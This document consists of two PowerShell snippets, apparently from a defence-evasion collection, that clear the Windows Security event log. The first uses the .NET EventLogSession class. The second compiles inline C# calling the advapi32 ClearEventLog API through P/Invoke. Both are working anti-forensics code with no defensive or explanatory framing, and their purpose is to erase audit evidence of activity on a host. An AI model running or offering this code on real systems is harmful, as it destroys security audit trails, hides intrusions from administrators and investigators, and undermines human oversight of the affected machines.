```powershell
# 1. Reflection via .NET Assembly
$assembly = [System.Diagnostics.Eventing.Reader.EventLogSession]
$session = New-Object $assembly
$session.ClearLog("Security")
```

```powershell
$Source = @"
using System;
using System.Runtime.InteropServices;

public class LogCleaner {
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr OpenEventLog(string lpUNCServerName, string lpSourceName);

    [DllImport("advapi32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ClearEventLog(IntPtr hEventLog, string lpBackupFileName);

    [DllImport("advapi32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseEventLog(IntPtr hEventLog);

    public static void Clean(string logName) {
        IntPtr hLog = OpenEventLog(null, logName);
        if (hLog != IntPtr.Zero) {
            ClearEventLog(hLog, null);
            CloseEventLog(hLog);
        }
    }
}
"@

Add-Type -TypeDefinition $Source -Language CSharp
[LogCleaner]::Clean("Security")
```
